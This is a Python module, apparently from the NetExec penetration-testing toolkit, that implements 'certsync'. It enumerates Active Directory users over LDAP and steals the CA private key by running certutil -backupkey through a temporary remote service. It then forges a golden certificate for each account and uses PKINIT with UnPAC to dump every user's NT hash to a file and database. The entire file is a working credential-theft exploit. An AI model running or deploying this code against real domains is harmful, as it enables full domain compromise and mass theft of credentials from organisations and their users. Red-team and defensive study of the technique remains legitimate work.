import datetime as dt
import logging
import os

from cryptography import x509
from impacket.dcerpc.v5 import rpcrt, scmr
from ldap3.protocol.formatters.formatters import format_sid

from certipy.commands.auth import Authenticate
from certipy.commands.ca import CA
from certipy.commands.forge import Forge
from certipy.lib.certificate import cert_id_to_parts, create_pfx, generate_rsa_key, get_identities_from_certificate, get_object_sid_from_certificate, get_subject_from_str, load_pfx
from certipy.lib.ldap import LDAPConnection
from certipy.lib.rpc import get_dce_rpc
from certipy.lib.target import DnsResolver, Target

from nxc.helpers.path import sanitize_path_component
from nxc.paths import NXC_PATH

# ACCOUNTDISABLE bit of userAccountControl, matched server-side with the LDAP_MATCHING_RULE_BIT_AND OID
DISABLED_ACCOUNT_FILTER = "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"

EMPTY_LM = "aad3b435b51404eeaad3b435b51404ee"


def build_target(connection, remote_name=None):
    dns_server = getattr(connection.args, "dns_server", None) or connection.kdcHost or connection.host
    resolver = DnsResolver.create(ns=dns_server, dc_ip=connection.kdcHost or connection.host)
    return Target(
        resolver=resolver,
        domain=connection.domain,
        username=connection.username,
        password=connection.password,
        remote_name=remote_name or connection.remoteName,
        hashes=f"{connection.lmhash}:{connection.nthash}",
        lmhash=connection.lmhash,
        nthash=connection.nthash,
        do_kerberos=connection.kerberos,
        aes=connection.aesKey,
        dc_ip=connection.kdcHost or connection.host,
        target_ip=connection.kdcHost or connection.host,
        ldap_scheme="ldap",
    )


def enum_users(ldap_conn, just_user, enabled_only):
    user_filter = (
        "(&(objectClass=user)(objectCategory=person)"
        + (f"(sAMAccountName={just_user})" if just_user else "")
        + (DISABLED_ACCOUNT_FILTER if enabled_only else "")
        + ")"
    )
    users = []
    for entry in ldap_conn.search(search_filter=user_filter, attributes=["objectSid", "sAMAccountName"]):
        raw_sid = entry.get_raw("objectSid")
        sam = entry.get("sAMAccountName")
        if raw_sid and sam:
            users.append((sam, format_sid(raw_sid[0])))
    return users


def load_ca(connection, ldap_conn, log):
    if not connection.args.ca_pfx:
        return dump_ca_pki(connection, ldap_conn, log)

    ca_pass = connection.args.pfx_pass.encode() if connection.args.pfx_pass else None
    with open(connection.args.ca_pfx, "rb") as ca_file:
        ca_key, ca_cert = load_pfx(ca_file.read(), ca_pass)
    log.debug(f"certsync: loaded CA certificate and private key from {connection.args.ca_pfx}")
    return ca_key, ca_cert


def dump_ca_pki(connection, ldap_conn, log):
    cas = ldap_conn.search("(&(objectClass=pKIEnrollmentService))", search_base=f"CN=Enrollment Services,CN=Public Key Services,CN=Services,{ldap_conn.configuration_path}", attributes=["name", "dNSHostName"])
    if not cas:
        log.fail("certsync: no certificate authority found in LDAP")
        return None, None

    ca = cas[0]
    if len(cas) > 1:
        log.debug(f"certsync: {len(cas)} CAs found, using the first one: {ca.get('name')}")
    ca_name = ca.get("name")
    ca_dns = ca.get("dNSHostName")
    log.debug(f"certsync: dumping CA key of '{ca_name}' from {ca_dns}")
    ca_key, ca_cert = backup_ca_pki(CA(target=build_target(connection, remote_name=ca_dns), ca=ca_name), log)
    if ca_key and ca_cert:
        save_ca_pfx(ca_key, ca_cert, ca_name, log)
    return ca_key, ca_cert


def save_ca_pfx(ca_key, ca_cert, ca_name, log):
    output_dir = os.path.join(NXC_PATH, "certs", "certsync")
    os.makedirs(output_dir, exist_ok=True)
    output_path = os.path.join(output_dir, sanitize_path_component(f"{ca_name}.pfx"))
    with open(output_path, "wb") as pfx_file:
        pfx_file.write(create_pfx(ca_key, ca_cert))
    log.highlight(f"CA PFX saved to {output_path} (reuse with --ca-pfx to forge offline)")


def backup_ca_pki(ca_module, log):
    # Dump the CA key by running certutil -backupkey through a temporary service on the CA host
    dce = get_dce_rpc(scmr.MSRPC_UUID_SCMR, "\\pipe\\svcctl", ca_module.target, timeout=ca_module.timeout, dynamic=ca_module.dynamic, auth_level_np=rpcrt.RPC_C_AUTHN_LEVEL_NONE)
    if dce is None:
        log.fail("certsync: failed to connect to the Service Control Manager on the CA host")
        return None, None

    handle = scmr.hROpenSCManagerW(dce)["lpScHandle"]
    config = f" -config {ca_module.config}" if ca_module.config else ""
    backup_cmd = (
        f"cmd.exe /c certutil{config} -backupkey -f -p certipy C:\\Windows\\Tasks\\Certipy && "
        "move /y C:\\Windows\\Tasks\\Certipy\\* C:\\Windows\\Tasks\\certipy.pfx"
    )

    try:
        service_handle = scmr.hRCreateServiceW(dce, handle, "Certipy", "Certipy", lpBinaryPathName=backup_cmd, dwStartType=scmr.SERVICE_DEMAND_START)["lpServiceHandle"]
    except Exception as e:
        if "ERROR_SERVICE_EXISTS" not in str(e):
            log.fail(f"certsync: failed to create the backup service: {e}")
            return None, None
        service_handle = scmr.hROpenServiceW(dce, handle, "Certipy")["lpServiceHandle"]
        scmr.hRChangeServiceConfigW(dce, service_handle, lpBinaryPathName=backup_cmd)

    key = cert = None
    try:
        try:
            scmr.hRStartServiceW(dce, service_handle)
        except Exception as e:
            log.debug(f"certsync: backup service start returned: {e}")
        pfx = ca_module.get_backup()
        if pfx:
            key, cert = load_pfx(pfx, b"certipy")
    except Exception as e:
        log.fail(f"certsync: CA backup failed: {e}")
    finally:
        cleanup_ca_backup(dce, service_handle, log)
    return key, cert


def cleanup_ca_backup(dce, service_handle, log):
    cleanup_cmd = "cmd.exe /c del /f /q C:\\Windows\\Tasks\\Certipy\\* && rmdir C:\\Windows\\Tasks\\Certipy"
    try:
        scmr.hRChangeServiceConfigW(dce, service_handle, lpBinaryPathName=cleanup_cmd)
        scmr.hRStartServiceW(dce, service_handle)
    except Exception as e:
        log.debug(f"certsync: backup directory cleanup returned: {e}")
    try:
        scmr.hRDeleteService(dce, service_handle)
        scmr.hRCloseServiceHandle(dce, service_handle)
    except Exception as e:
        log.fail(f"certsync: failed to delete the temporary 'Certipy' service on the CA host, remove it manually: {e}")


def forge_user_cert(forger, ca_key, ca_cert, user_key, upn, sid):
    forger.alt_upn = upn
    forger.alt_sid = sid
    now = dt.datetime.now(dt.UTC)
    builder = (
        x509.CertificateBuilder()
        .subject_name(get_subject_from_str(f"CN={cert_id_to_parts([('UPN', upn)])[0]}"))
        .issuer_name(ca_cert.subject)
        .public_key(user_key.public_key())
        .serial_number(forger.get_serial_number())
        .not_valid_before(now - dt.timedelta(days=1))
        .not_valid_after(now + dt.timedelta(days=365))
        .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key()), False)
        .add_extension(x509.SubjectKeyIdentifier.from_public_key(user_key.public_key()), False)
    )
    sans = forger.create_subject_alternative_names()
    if sans:
        builder = builder.add_extension(x509.SubjectAlternativeName(sans), False)
    sid_extension = forger.create_sid_extension()
    if sid_extension:
        builder = builder.add_extension(sid_extension, False)
    return builder.sign(ca_key, forger.get_allowed_hash_algorithm(ca_cert.signature_hash_algorithm))


def unpac_user(target, cert, key, sam, domain):
    auth = Authenticate(target=target)
    auth.cert = cert
    auth.key = key
    auth.no_save = True
    identities = get_identities_from_certificate(cert)
    id_type, identity = identities[0] if identities else (None, None)
    object_sid = get_object_sid_from_certificate(cert)
    if auth.kerberos_authentication(sam.lower(), domain.lower(), False, id_type, identity, object_sid, f"{sam}@{domain}".lower()):
        return auth.nt_hash
    return None


def certsync_dump(connection):
    """Dump NT hashes without DRSUAPI, through golden certificates and UnPAC the hash (technique by zblurx).

    Enumerate the accounts over LDAP, get the CA key (provided PFX or dumped remotely), forge a certificate
    for each account signed with that key, then PKINIT + UnPAC the NT hash from the PAC.
    """
    log = connection.logger
    logging.getLogger("impacket").disabled = True
    logging.getLogger("certipy").disabled = True

    domain = connection.domain
    ldap_conn = LDAPConnection(target=build_target(connection))
    try:
        ldap_conn.connect()
    except Exception as e:
        log.fail(f"certsync: LDAP connection failed: {e}")
        return

    just_user = connection.args.userntds
    users = enum_users(ldap_conn, just_user, connection.args.enabled)
    if not users:
        log.fail(f"certsync: no users found{f' matching {just_user}' if just_user else ''}")
        return
    log.display(f"certsync: found {len(users)} user(s) in LDAP")

    ca_key, ca_cert = load_ca(connection, ldap_conn, log)
    if ca_key is None or ca_cert is None:
        log.fail("certsync: no CA certificate/private key available (backup failed or bad --ca-pfx); aborting")
        return

    target = build_target(connection)
    output_filename = connection.output_file_template.format(output_folder="ntds")
    os.makedirs(os.path.dirname(output_filename), exist_ok=True)
    outfile = f"{output_filename}.ntds"
    host_id = connection.db.get_hosts(filter_term=connection.host)[0][0]

    log.success("Forging certificates and UnPACing the hashes, this could take a while so go grab a redbull...")
    forger = Forge()
    user_key = generate_rsa_key(2048)  # one throwaway key reused for every account (the keygen is the slow part)
    dumped = added = 0
    with open(outfile, "w") as results:
        for sam, sid in users:
            rid = sid.rsplit("-", 1)[-1]
            try:
                cert = forge_user_cert(forger, ca_key, ca_cert, user_key, f"{sam}@{domain}", sid)
                nthash = unpac_user(target, cert, user_key, sam, domain)
            except Exception as e:
                log.debug(f"certsync: {sam} failed: {e}")
                nthash = None
            if not nthash:
                continue
            line = f"{domain}\\{sam}:{rid}:{EMPTY_LM}:{nthash}:::"
            log.highlight(line)
            results.write(line + "\n")
            dumped += 1
            if "$" not in sam:
                connection.db.add_credential("hash", domain, sam, f"{EMPTY_LM}:{nthash}", pillaged_from=host_id)
                added += 1

    log.success(f"Dumped {dumped} NTDS hashes to {outfile} of which {added} were added to the database")
